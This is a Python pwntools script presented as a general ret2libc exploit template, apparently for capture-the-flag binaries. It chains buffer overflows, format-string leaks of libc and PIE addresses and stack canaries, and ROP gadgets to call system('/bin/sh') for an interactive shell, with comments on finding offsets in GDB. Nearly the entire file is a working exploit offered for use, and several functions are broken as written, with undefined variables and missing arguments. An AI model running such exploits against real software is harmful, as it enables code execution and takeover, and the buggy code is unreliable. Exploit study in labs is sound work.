from pwn import *
from sys import argv


def menu():
	print(f"""ret2libc_with_pie(libc_so, func_index, symbol,base_addr, libc_func, padding)
ret2libc_without_pie(libc_so, padding)
{"-"*80}
no pie:
	python3 ret2libc.py binary libc6_2.27-3ubuntu1.2_amd64.so 140
{"-"*80}
with pie:
	python3 ret2libc.py binary libc6_2.27-3ubuntu1.2_amd64.so 3 read 15 25 140
						^-- target     ^					  ^   ^   ^  ^  ^
									   |----- libc            |   |   |  |  ---- padding
									   				 -------   |   |  |  
														|         |   |  |--- libc func leak for libc base calculation
									   		function index     |   |
											(not stack index)     |   ----- ELF base leak
														    	  |
															      ---symbol for libc base calculation\n""")



def ret2libc_without_pie(program,libc_so, active_process, padding,cookie_index, stack_cookie=False, debugger=False):
	if debugger == True:
		gdb.attach(program)
	rop = ROP(program)
	rop.raw(padding)

	puts_or_printf = 0
	try:
		puts_or_printf = 1
		rop.puts(active_process.got.puts) 
	except:
		puts_or_printf = 2
		rop.puts(active_process.got.printf)
	rop.main()  # if binary doesn't have a main try it without this if not call the function that that BOF is in

	active_process.sendline(rop.chain())
	got_leak = active_process.recvline()  # grab puts got leak
	got_leak = u64(got_leak.ljust(8,b'\x00'))  # make sure the value grabbed is 8 byte alligned 

	if puts_or_printf == 1:
		log.info(f"puts got leak: {got_leak:016x}")
	elif puts_or_printf == 2:
		log.info(f"printf got leak {got_leak:016x}")

	libc = ELF(libc_so, checksec=False)
	libc.address = got_leak - libc.sym.puts  # real address of puts - offset of puts

	rop2 = ROP([program, libc])
	if stack_cookie is not False:
		cookie_leak = f"%{cookie_index}$p"
		active_process.sendline(bytes(cookie_leak.encode()))
		cookie = p64(active_process.recvline())
		payload += cookie
		payload += p64(0xdeadbeef13371337) # value to overwritw RBP, we do this because after the stack canary we go into RBP before RIP

	rop2.raw(padding)
	rop2.raw(rop.find_gadget(["ret"])[0])  # ret for stack allignment
	rop2.system(next(libc.search(b"/bin/sh")))
	active_process.sendline(rop2.chain())

	active_process.interactive()

# libc_so = libc6_2.27-3ubuntu1.2_amd64.so

# you will need to find libc_start_main via format string exploitation
# (^ related to this: libc_start_main will look something like this -> 0x7ffd02d5cc80)
# (^ memory locations start and ends can be found using 'vmmap' command in GDB)
# then goto: https://libc.blukat.me and download the LIBC

# func_index = index which function is at 
# gef➤  x 0x7ffff7d0ccf1
# 0x7ffff7d0ccf1 <__GI___libc_read+17>:   0xf0003d48
#                                  ^--- this is the index

# symbol - function that you leak (will be used to calculate libc base address) for example: read, write, exit

# base_addr = the index on the stack where the base address is
# (^ again using vmmap in GDB will give you a general idea on what these addresses would look like, here's an example -> 0x55fb45bd874a)

# libc_func = any function will work this is used to calculate base address of libc this take the index on the stack in which a function from libc is
# (^ again using vmmap in GDB will give you a general idea on what these addresses may look like, here's an example -> 0x7f7b8af0ccf1)
# (^ i suggest going into GDB and using 'x 0x7f7b8af0ccf1' to see what an address points to this will help find and verify these addresses)

# active_process = process of bin loaded with pwntools using process()

# padding = padding until instruction pointer overwrite

# stack cookie=False by default if True then you need to input the index value on the stack in which it lies
# (^ related to this: it is important to know that this is just a template input may be taken else where for format string exploitation)

# debugger=False by default if you want GDB attached then make it True
def ret2libc_with_pie(libc_so, func_index, symbol,base_addr, libc_func,active_process, padding,cookie_index,stack_cookie=False, debugger=False):
	# REMEMBER THAT THIS IS A TEMPLATE AND THAT THIS WONT BE A 1 WAY SOLVE ALL YOU NEED TO ADJUST ACCORDINGLY
	# TO HOW THE PROGRAM INTERACTS WITH STDIN, WHERE THE INPUT IS FOR FORMAT STRING EXPLOITATION, ETC.
	if debugger is True:
		gdb.attach(binary)

	libc_func_payload = f"%{libc_func}$p"
	base_addr_payload = f"%{base_addr}$p"

	libc = ELF(libc_so, checksec=False)

	active_process.sendline(bytes(libc_func_payload.encode()))
	libc_func_leak = active_process.recvline().strip()

	active_process.sendline(bytes(base_addr_payload.encode()))
	base_address = active_process.recvline().strip()
    
	# gef➤  x 0x7ffff7d0ccf1
    # 0x7ffff7d0ccf1 <__GI___libc_read+17>:   0xf0003d48
	libc.address = int(libc_func_leak) - int(func_index) - int(libc.sym[symbol])

	# find beginning page offset by going into GDB and running vmmap
	active_process.address = int(base_address) - int(0x00000000001000)  # base address - beginning page offset 
	
	payload = padding
	if stack_cookie is not False:
		cookie_leak = f"%{cookie_index}$p"
		active_process.sendline(bytes(cookie_leak.encode()))
		cookie = p64(active_process.recvline())
		payload += cookie
		payload += p64(0xdeadbeef13371337) # value to overwritw RBP, we do this because after the stack canary we go into RBP before RIP


	payload = p64(active_process.address+rop.find_gadget(["pop rdi"])[0]) # pop rdi ; ret
	payload += p64(next(libc.search(b'/bin/sh')))                         # /bin/sh for RDI
	payload += p64(active_process.address+rop.find_gadget(["ret"])[0])              # ret   :  for stack allignment
	payload += p64(libc.symbols[b'system'])                               # call system
	payload += p64(0xdeadbeefcafebabe)                                    # system expects something to return to afterwards so we just put a dummy addr

	active_process.sendline(payload)
	active_process.interactive()


try:
	with process(argv[1]) as proc:
		binary = context.binary = ELF(argv[1], checksec=True)
		context.update(arch="amd64")

		stack_cookie = input("stack cookie or no stack cookie (y n) -> ")
		debugger = input("debugger or no debugger (y n) -> ")
		pie_or_no_pie = input("pie or no pie (y n) -> ")
		
		if pie_or_no_pie == "n":
			if stack_cookie == "y" and debugger == "n":
				cookie_stack_index = input("enter stack cookie index on the stack for format string vuln -> ")
				ret2libc_without_pie(binary, argv[2], padding=argv[3], active_process=proc,cookie_index=cookie_stack_index, debugger=False, stack_cookie=True)
			elif debugger == "y" and stack_cookie == "n":
				# def ret2libc_without_pie(program,libc_so, active_process, padding,stack_cookie=False, debugger=False):
				ret2libc_without_pie(binary, argv[2], padding=argv[3], active_process=proc, debugger=True)
			elif debugger == "n" and stack_cookie == "n":
				ret2libc_without_pie(binary, argv[2], padding=argv[3], active_process=proc)
			elif debugger == "y" and stack_cookie == "y":
				cookie_stack_index = input("enter stack cookie index on the stack for format string vuln -> ")
				ret2libc_without_pie(binary, argv[2], padding=argv[3], active_process=proc,cookie_index=cookie_stack_index, debugger=True, stack_cookie=True)


		elif pie_or_no_pie == "y":
			if stack_cookie == "y" and debugger == "n":
				cookie_stack_index = input("enter stack cookie index on the stack for format string vuln -> ")
				ret2libc_with_pie(libc_so=argv[2], func_index=argv[3], symbol=argv[4], base_addr=argv[5],
		      libc_func=argv[6], padding=argv[7], cookie_index=cookie_stack_index, stack_cookie=True)
			elif debugger == "y" and stack_cookie == "n":
				ret2libc_with_pie(libc_so=argv[2], func_index=argv[3], symbol=argv[4], base_addr=argv[5],
		      libc_func=argv[6], padding=argv[7], debugger=True)
			elif debugger == "n" and stack_cookie == "n":
				ret2libc_with_pie(libc_so=argv[2], func_index=argv[3], symbol=argv[4], base_addr=argv[5],
		      libc_func=argv[6], padding=argv[7])
			elif debugger == "y" and stack_cookie == "y":
				cookie_stack_index = input("enter stack cookie index on the stack for format string vuln -> ")
				ret2libc_with_pie(libc_so=argv[2], func_index=argv[3], symbol=argv[4], base_addr=argv[5],
		      libc_func=argv[6], padding=argv[7], cookie_index=cookie_stack_index, stack_cookie=True, debugger=True)


except IndexError:
	menu()
